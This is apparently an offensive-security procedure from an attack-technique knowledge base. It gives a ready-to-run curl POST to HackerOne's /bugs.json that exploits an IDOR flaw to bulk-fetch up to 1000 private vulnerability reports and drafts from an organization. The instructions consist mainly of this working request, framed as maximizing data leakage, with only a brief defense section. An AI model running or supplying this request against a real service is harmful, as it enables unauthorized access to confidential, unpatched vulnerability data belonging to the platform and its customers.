---
id: proc-idor-bulk-fetch-hackerone
tags:
  - idor
  - web
  - data-exfiltration
  - bulk-retrieval
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/hackerone-idor-bulk-fetch-reports]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:25:48.249Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
---
# Bulk Fetch Private Reports with Pagination via IDOR

## Summary

This procedure extends the IDOR exploitation in HackerOne's /bugs.json by removing the text_query and adding pagination (limit=1000, page=1) along with filters for open states and program states, enabling bulk retrieval of up to 1000 private reports, including drafts, from a target organization like HackerOne's internal org (ID 13).

## Description

Building on the initial query, this targets broader data leakage by fetching all open and editing reports without search constraints, sorted by latest activity. It exposes drafted reports and program details (e.g., handlers, descriptions) due to missing permission checks. Ideal for maximizing impact in vulnerability assessments; requires the same authentication as the initial procedure, with outcomes including large JSON datasets for offline analysis.

## Requirements

1. Valid HackerOne session cookies and CSRF token from prior authentication.
2. Target organization ID (e.g., 13 for internal HackerOne org).
3. HTTPS access to hackerone.com.
4. Ability to handle large JSON responses (e.g., via curl -o output.json).

## Defense

Defensive measures and detection strategies:

- Enforce pagination limits and require explicit permissions for bulk queries.
- Audit logs for empty text_query combined with high limit values or unusual organization_ids.
- Implement data loss prevention (DLP) rules to block exfiltration of report metadata.

## Objectives

1. Retrieve maximum volume of private reports in a single request.
2. Access unpublished drafts and internal program data.
3. Demonstrate scalable data leakage potential.

## Instructions

### Step 1: Reuse Authentication

**Context**: Use the session from the initial procedure; refresh CSRF if expired by making a GET to a HackerOne page.

No command; manual verification.

### Step 2: Execute Bulk Fetch

**Context**: POST to /bugs.json with empty text_query, high limit, and state filters to pull comprehensive report data from the target org.

**Command** ([[commands/hackerone-idor-bulk-fetch-reports]]):

```bash
curl -X POST 'https://hackerone.com/bugs.json' \
  -H 'Cookie: Your-Cookies' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' \
  -H 'Accept: application/json, text/javascript, */*; q=0.01' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: https://hackerone.com/bugs?subject=user' \
  -H 'X-Csrf-Token: Csrf-Token' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'text_query=' \
  --data-urlencode 'organization_id=13' \
  --data-urlencode 'view=open' \
  --data-urlencode 'substates[]=new' \
  --data-urlencode 'substates[]=needs-more-info' \
  --data-urlencode 'substates[]=pending-program-review' \
  --data-urlencode 'substates[]=triaged' \
  --data-urlencode 'substates[]=pre-submission' \
  --data-urlencode 'substates[]=retesting' \
  --data-urlencode 'substates[]=not-applicable' \
  --data-urlencode 'substates[]=editing' \
  --data-urlencode 'substates[]=informative' \
  --data-urlencode 'program_states[]=2' \
  --data-urlencode 'program_states[]=3' \
  --data-urlencode 'program_states[]=4' \
  --data-urlencode 'program_states[]=5' \
  --data-urlencode 'sort_type=latest_activity' \
  --data-urlencode 'sort_direction=descending' \
  --data-urlencode 'limit=1000' \
  --data-urlencode 'page=1'
```

> This fetches up to 1000 reports sorted by latest activity; output is JSON with report details. Success: Retrieval of drafts and private org data.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used

- [[commands/hackerone-idor-bulk-fetch-reports]]

## Tools Used


## Tags

- idor
- web
- bulk-retrieval
- data-exfiltration
